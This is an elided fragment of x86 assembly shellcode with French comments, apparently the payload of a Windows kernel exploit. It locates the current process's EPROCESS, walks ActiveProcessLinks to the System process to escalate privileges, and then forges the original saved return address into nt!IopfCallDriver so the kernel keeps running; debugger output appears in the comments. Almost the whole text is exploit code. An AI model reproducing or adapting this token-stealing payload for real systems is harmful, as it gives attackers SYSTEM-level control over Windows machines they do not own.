...
find_current_eprocess:
	...
	mov eax, dword [eax + 0x40 + 0x10]      ;EAX = KTHREAD.ApcState.Process
	...
	xor ecx, ecx
	mov cl, 0xB8 ;EDX = offset EPROCESS.ActiveProcessLinks :: On stocke l'offset ici, plus commode
...
escaladate_privileges:
	; EBP = notre EPROCESS
	; EDX = System EPROCESS
	sub dl, 0xB8 ; On realigne pour avoir l'EPROCESS
...
it_is_done_folks:
	...
	;On recupere la base du kern /!\ Il faut set l'affinity du thread userland sur le core0, sinon le KdVersionBlock n'est pas remplis dans le kpcr des autres cores !
	xor  eax, eax
	mov  eax, [fs:eax + 0x34]
	mov  eax, [eax + 0x10]
	
	;On reforge le seip original
	;Notre fonction est appeler par nt!IopfCallDriver+0x31 = 8284a593 = seip originel
	;0: kd> ? 8284a593 - nt
	;Evaluate expression: 226707 = 00037593
	xor ebx, ebx
	inc ebx
	inc ebx
	inc ebx
	
	shl ebx, 16 ;EBX = 0x30000
